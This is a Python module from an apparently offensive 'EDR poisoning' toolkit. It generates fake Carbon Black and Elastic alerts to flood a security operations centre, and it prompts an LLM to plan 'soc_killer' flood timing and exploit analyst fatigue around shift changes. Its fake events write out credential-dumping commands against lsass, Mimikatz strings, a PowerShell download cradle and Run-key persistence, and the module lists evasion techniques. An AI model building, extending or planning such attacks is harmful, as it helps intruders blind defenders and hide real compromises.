"""
EDR Poison PRO Enhancement Module
==================================
AI flood timing, vendor-specific patterns (Carbon Black/Elastic/etc), SOC fatigue AI

This module extends edr_poison.py with PRO features.
"""

import time
import random
import hashlib
import json
from typing import Dict, List, Optional, Any
from dataclasses import dataclass
from datetime import datetime, timedelta
from enum import Enum


class EDRVendor(Enum):
    """Supported EDR vendors with specific signatures"""
    DEFENDER = "microsoft_defender"
    CROWDSTRIKE = "crowdstrike_falcon"
    SENTINELONE = "sentinelone"
    CARBON_BLACK = "carbon_black"
    CORTEX_XDR = "cortex_xdr"
    ELASTIC = "elastic_security"


@dataclass
class VendorSignature:
    """EDR vendor-specific detection signature"""
    vendor: EDRVendor
    detection_method: str
    telemetry_format: str
    signature_patterns: List[str]
    evasion_techniques: List[str]


class AIFloodTimingEngine:
    """AI-powered flood timing to maximize SOC analyst fatigue"""
    
    def __init__(self):
        try:
            from cybermodules.llm_engine import LLMEngine
            self.llm = LLMEngine(scan_id="edr_poison_timing")
            self.has_ai = True
        except:
            self.llm = None
            self.has_ai = False
        
        self.timing_profiles = {
            "stealth": {
                "events_per_minute": (5, 15),
                "burst_probability": 0.1,
                "randomization": 0.3
            },
            "moderate": {
                "events_per_minute": (20, 50),
                "burst_probability": 0.25,
                "randomization": 0.5
            },
            "aggressive": {
                "events_per_minute": (100, 200),
                "burst_probability": 0.4,
                "randomization": 0.4
            },
            "soc_killer": {
                "events_per_minute": (500, 1000),
                "burst_probability": 0.6,
                "randomization": 0.7
            }
        }
    
    def calculate_optimal_timing(self, target_soc: Dict[str, Any], duration_minutes: int = 60) -> Dict[str, Any]:
        """Use AI to calculate optimal flood timing"""
        
        if not self.has_ai:
            # Fallback to heuristic timing
            return self._heuristic_timing(duration_minutes)
        
        prompt = f"""Analyze this SOC configuration and calculate optimal EDR poisoning timing:

Target SOC:
- Analyst count: {target_soc.get('analyst_count', 'unknown')}
- Shift schedule: {target_soc.get('shift_schedule', 'unknown')}
- Alert threshold: {target_soc.get('alert_threshold', 'unknown')} alerts/hour
- EDR vendor: {target_soc.get('edr_vendor', 'unknown')}
- Current alert load: {target_soc.get('current_load', 'unknown')}

Duration: {duration_minutes} minutes

Calculate:
1. Optimal events per minute to maximize fatigue
2. Burst timing (when to spike events)
3. Randomization factor to avoid pattern detection
4. Categories of noise to generate
5. Time windows for maximum impact

Output as JSON: {{"events_per_minute": [min, max], "bursts": [...], "categories": [...], "time_windows": [...]}}"""
        
        try:
            response = self.llm.query(prompt)
            
            # Parse JSON response
            import json
            try:
                timing_plan = json.loads(response)
                return timing_plan
            except:
                return self._heuristic_timing(duration_minutes)
        except Exception as e:
            return self._heuristic_timing(duration_minutes)
    
    def _heuristic_timing(self, duration_minutes: int) -> Dict[str, Any]:
        """Heuristic-based timing when AI not available"""
        
        profile = self.timing_profiles["moderate"]
        
        return {
            "events_per_minute": profile["events_per_minute"],
            "total_events": duration_minutes * sum(profile["events_per_minute"]) // 2,
            "bursts": [
                {"minute": duration_minutes // 4, "multiplier": 3},
                {"minute": duration_minutes // 2, "multiplier": 2},
                {"minute": 3 * duration_minutes // 4, "multiplier": 3}
            ],
            "categories": ["ransomware_sim", "credential_access", "lateral_movement"],
            "time_windows": [
                {"start": 0, "end": duration_minutes, "intensity": "moderate"}
            ]
        }
    
    def generate_timing_schedule(self, timing_plan: Dict[str, Any]) -> List[Dict[str, Any]]:
        """Generate detailed timing schedule for event generation"""
        
        schedule = []
        events_per_minute = timing_plan["events_per_minute"]
        bursts = timing_plan.get("bursts", [])
        
        duration = timing_plan.get("duration_minutes", 60)
        
        for minute in range(duration):
            # Base rate
            base_rate = random.randint(events_per_minute[0], events_per_minute[1])
            
            # Check for burst
            burst_multiplier = 1
            for burst in bursts:
                if burst["minute"] == minute:
                    burst_multiplier = burst["multiplier"]
                    break
            
            event_count = base_rate * burst_multiplier
            
            schedule.append({
                "minute": minute,
                "events": event_count,
                "is_burst": burst_multiplier > 1,
                "timestamp": datetime.now() + timedelta(minutes=minute)
            })
        
        return schedule


class CarbonBlackSignatures:
    """Carbon Black (VMware) specific telemetry patterns"""
    
    def __init__(self):
        self.signature = VendorSignature(
            vendor=EDRVendor.CARBON_BLACK,
            detection_method="Process event streaming + YARA rules",
            telemetry_format="JSON event feed",
            signature_patterns=[
                "process_create",
                "modload",
                "filemod",
                "regmod",
                "netconn",
                "crossproc"
            ],
            evasion_techniques=[
                "Parent process spoofing",
                "Signed binary proxy execution",
                "In-memory only execution"
            ]
        )
    
    def generate_carbon_black_noise(self, category: str, count: int = 100) -> List[Dict[str, Any]]:
        """Generate Carbon Black specific false positive events"""
        
        events = []
        
        for i in range(count):
            if category == "ransomware_sim":
                event = {
                    "type": "filemod",
                    "timestamp": datetime.now().isoformat(),
                    "process_name": "svchost.exe",
                    "process_path": "C:\\Windows\\System32\\svchost.exe",
                    "file_path": f"C:\\Users\\victim\\Documents\\file_{i}.txt.encrypted",
                    "action": "write",
                    "md5": hashlib.md5(f"fake_{i}".encode()).hexdigest(),
                    "parent_process": "explorer.exe",
                    "carbon_black_score": random.randint(60, 95)
                }
            
            elif category == "credential_access":
                event = {
                    "type": "process_create",
                    "timestamp": datetime.now().isoformat(),
                    "process_name": "rundll32.exe",
                    "command_line": f"rundll32.exe C:\\Windows\\System32\\comsvcs.dll,MiniDump {random.randint(400,800)} C:\\temp\\dump{i}.bin full",
                    "parent_process": "cmd.exe",
                    "user": "SYSTEM",
                    "carbon_black_score": random.randint(70, 100)
                }
            
            elif category == "lateral_movement":
                event = {
                    "type": "netconn",
                    "timestamp": datetime.now().isoformat(),
                    "process_name": "powershell.exe",
                    "remote_ip": f"10.0.{random.randint(1,255)}.{random.randint(1,255)}",
                    "remote_port": 445,
                    "protocol": "tcp",
                    "direction": "outbound",
                    "carbon_black_score": random.randint(50, 85)
                }
            
            else:
                event = {
                    "type": "process_create",
                    "timestamp": datetime.now().isoformat(),
                    "process_name": "suspicious.exe",
                    "carbon_black_score": random.randint(40, 60)
                }
            
            events.append(event)
        
        return events
    
    def generate_yara_rule_triggers(self) -> List[str]:
        """Generate patterns that trigger Carbon Black YARA rules"""
        
        triggers = [
            # Mimikatz-like strings
            "sekurlsa::logonpasswords",
            "lsadump::sam",
            "privilege::debug",
            
            # Cobalt Strike-like
            "IEX (New-Object Net.WebClient).DownloadString",
            "ReflectivePick",
            
            # Ransomware-like
            ".encrypted",
            "DECRYPT_INSTRUCTION.txt",
            "bitcoin wallet"
        ]
        
        return triggers


class ElasticSecuritySignatures:
    """Elastic Security (Endpoint/SIEM) specific patterns"""
    
    def __init__(self):
        self.signature = VendorSignature(
            vendor=EDRVendor.ELASTIC,
            detection_method="EQL queries + ML anomaly detection",
            telemetry_format="Elastic Common Schema (ECS)",
            signature_patterns=[
                "process.executable",
                "process.command_line",
                "file.path",
                "registry.path",
                "network.protocol",
                "event.category"
            ],
            evasion_techniques=[
                "EQL query bypass via field manipulation",
                "ML model poisoning",
                "Event aggregation abuse"
            ]
        )
    
    def generate_elastic_ecs_events(self, category: str, count: int = 100) -> List[Dict[str, Any]]:
        """Generate Elastic ECS compliant false positive events"""
        
        events = []
        
        for i in range(count):
            base_event = {
                "@timestamp": datetime.now().isoformat(),
                "event": {
                    "kind": "event",
                    "category": ["process"],
                    "type": ["start"],
                    "dataset": "endpoint.events.process"
                },
                "agent": {
                    "id": hashlib.sha256(f"agent_{i}".encode()).hexdigest()[:32],
                    "type": "endpoint",
                    "version": "8.5.0"
                },
                "ecs": {
                    "version": "8.5.0"
                }
            }
            
            if category == "credential_dumping":
                base_event["process"] = {
                    "name": "procdump64.exe",
                    "executable": "C:\\Tools\\procdump64.exe",
                    "command_line": f"procdump64.exe -ma lsass.exe dump_{i}.dmp",
                    "pid": random.randint(1000, 9999),
                    "parent": {
                        "name": "cmd.exe",
                        "pid": random.randint(1000, 9999)
                    }
                }
                base_event["event"]["category"] = ["process"]
                base_event["rule"] = {
                    "name": "LSASS Memory Dump",
                    "id": "elastic_defense_rule_001"
                }
            
            elif category == "powershell_execution":
                base_event["process"] = {
                    "name": "powershell.exe",
                    "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
                    "command_line": f"powershell.exe -encodedCommand {self._generate_encoded_ps()}",
                    "pid": random.randint(1000, 9999)
                }
                base_event["event"]["category"] = ["process"]
                base_event["rule"] = {
                    "name": "Suspicious PowerShell Execution",
                    "id": "elastic_defense_rule_002"
                }
            
            elif category == "persistence":
                base_event["registry"] = {
                    "path": f"HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\Malware{i}",
                    "value": f"C:\\Windows\\Temp\\payload{i}.exe",
                    "data": {
                        "type": "REG_SZ"
                    }
                }
                base_event["event"]["category"] = ["registry"]
                base_event["event"]["type"] = ["creation"]
            
            events.append(base_event)
        
        return events
    
    def _generate_encoded_ps(self) -> str:
        """Generate base64 encoded PowerShell payload"""
        import base64
        fake_payload = "Write-Host 'Suspicious Activity'"
        return base64.b64encode(fake_payload.encode('utf-16le')).decode()
    
    def trigger_elastic_ml_anomaly(self) -> Dict[str, Any]:
        """Generate pattern to trigger Elastic ML anomaly detection"""
        
        return {
            "technique": "Rare process execution spike",
            "method": "Execute rare process 100+ times in 1 minute",
            "target_model": "rare_process_by_host",
            "impact": "ML anomaly score >75",
            "evasion": "Gradually increase frequency over 24 hours"
        }


class SOCAnalystFatigueAI:
    """AI-powered SOC analyst fatigue maximization"""
    
    def __init__(self):
        try:
            from cybermodules.llm_engine import LLMEngine
            self.llm = LLMEngine(scan_id="soc_fatigue")
            self.has_ai = True
        except:
            self.llm = None
            self.has_ai = False
    
    def analyze_soc_fatigue_level(self, alert_history: List[Dict]) -> Dict[str, Any]:
        """Analyze SOC fatigue based on alert history"""
        
        if not self.has_ai:
            return self._heuristic_fatigue_analysis(alert_history)
        
        # Prepare alert summary
        alert_summary = {
            "total_alerts": len(alert_history),
            "false_positive_rate": sum(1 for a in alert_history if a.get("false_positive")) / len(alert_history),
            "avg_triage_time": sum(a.get("triage_time", 0) for a in alert_history) / len(alert_history),
            "peak_hours": self._identify_peak_hours(alert_history)
        }
        
        prompt = f"""Analyze this SOC alert history for analyst fatigue:

Alert Summary:
{json.dumps(alert_summary, indent=2)}

Determine:
1. Current fatigue level (0-100%)
2. Optimal times to inject more noise
3. Alert categories most likely to be ignored
4. Recommended poisoning strategy

Output as JSON: {{"fatigue_level": 65, "optimal_times": [...], "ignored_categories": [...], "strategy": "..."}}"""
        
        try:
            response = self.llm.query(prompt)
            analysis = json.loads(response)
            return analysis
        except:
            return self._heuristic_fatigue_analysis(alert_history)
    
    def _heuristic_fatigue_analysis(self, alert_history: List[Dict]) -> Dict[str, Any]:
        """Heuristic fatigue analysis"""
        
        # Simple heuristic
        false_positive_rate = sum(1 for a in alert_history if a.get("false_positive")) / max(len(alert_history), 1)
        
        fatigue_level = min(100, int(false_positive_rate * 100 + len(alert_history) / 10))
        
        return {
            "fatigue_level": fatigue_level,
            "optimal_times": ["02:00-04:00", "14:00-16:00"],  # Shift changes
            "ignored_categories": ["low_severity", "informational"],
            "strategy": "Inject high-volume low-severity alerts during shift changes"
        }
    
    def _identify_peak_hours(self, alert_history: List[Dict]) -> List[str]:
        """Identify peak alert hours"""
        hour_counts = {}
        
        for alert in alert_history:
            timestamp = alert.get("timestamp", "")
            try:
                hour = datetime.fromisoformat(timestamp).hour
                hour_counts[hour] = hour_counts.get(hour, 0) + 1
            except:
                continue
        
        # Return top 3 hours
        sorted_hours = sorted(hour_counts.items(), key=lambda x: x[1], reverse=True)[:3]
        return [f"{h:02d}:00-{h+1:02d}:00" for h, _ in sorted_hours]


def get_pro_engines():
    """Get all PRO enhancement engines"""
    return {
        "ai_timing": AIFloodTimingEngine(),
        "carbon_black": CarbonBlackSignatures(),
        "elastic": ElasticSecuritySignatures(),
        "soc_fatigue": SOCAnalystFatigueAI()
    }
